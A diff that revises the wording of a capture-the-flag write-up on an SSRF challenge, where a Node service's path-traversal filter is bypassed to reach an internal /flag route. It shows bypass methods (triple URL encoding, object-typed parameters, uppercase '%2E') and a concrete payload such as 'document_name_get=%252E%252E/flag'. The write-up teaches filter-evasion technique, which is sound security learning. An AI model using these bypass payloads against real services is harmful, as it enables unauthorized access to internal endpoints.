@@ -11,7 +11,7 @@ But they were not aware of the wolf's plan to bypass the wall!
 
 ### Solution
 
-The first hint was in the header, then we can get the source code:
+The first hint was inside the header, and the source code can be found from it:
 
 ```
 HTTP/1.1 200 OK
@@ -113,29 +113,27 @@ private_s.get('/flag', function (request, result) {
 })
 ```
 
-We have to access the `http://localhost:9000/flag` to get flag.
-But the common symbols to do path traversal was blocked：`.`, `2e`
+Apparently we have to access `http://localhost:9000/flag` to get the flag, but some common symbols for path traversal(`.`, `2e`) were blocked, even the unicode bypass characters(`┮`, `Ｎ`) were also blocked.
+(ref: Orange Tsai：[A New Era Of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
 
-Even the unicode bypass char was blocked：`┮`, `Ｎ`
-(from Orange Tsai：[A New Era Of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
-
-It uses normalizeUrl() to encode unicode character, so the unicode failure seems not working here.
+We found that it uses `normalizeUrl()` to encode unicode characters, so the unicode failure seems not working here.
 
 ```
-Origin:    http://localhost:9001/documents/ＮＮ
-Normalize: http://localhost:9001/documents/%EF%BC%AE%EF%BC%AE
+Original:    http://localhost:9001/documents/ＮＮ
+Normalized:  http://localhost:9001/documents/%EF%BC%AE%EF%BC%AE
 ```
 
-And I don't know why to block the char `Ｅ` XDDDD
+(I don't know why to block the char `Ｅ` XDDDD)
 
-After few tries on the local, we can bypass easily by triple encoding、request with object type.
-You could even just use `%2E` because of the block char `%2e` wasn't case sensitive.
+After few tries on the local machine, we find it can be easily bypassed through three ways:
+Triple encoding, request with `object` type.
+We could even just use `%2E` because the blocking rule `%2e` was case insensitive.
 
 ```
 ### console.log for test ###
 
-console.log('Origin:    http://localhost:9001/documents/' + document_name)
-console.log('Normalize: ' + normalizeUrl('http://localhost:9001/documents/' + document_name))
+console.log('Original:    http://localhost:9001/documents/' + document_name)
+console.log('Normalized:  ' + normalizeUrl('http://localhost:9001/documents/' + document_name))
 console.log('Typeof:    ' + typeof(document_name))
 console.log('indexOf(.):' + document_name.indexOf('.'))
 
@@ -148,7 +146,7 @@ Normalize: http://localhost:9001/flag
 Typeof:    string
 indexOf(.):-1
 
-#2 bypass with case sensitive
+#2 bypass using different case
 Request args：document_name_get=%252E%252E/flag
 Origin:    http://localhost:9001/documents/%2E%2E/flag
 Normalize: http://localhost:9001/flag
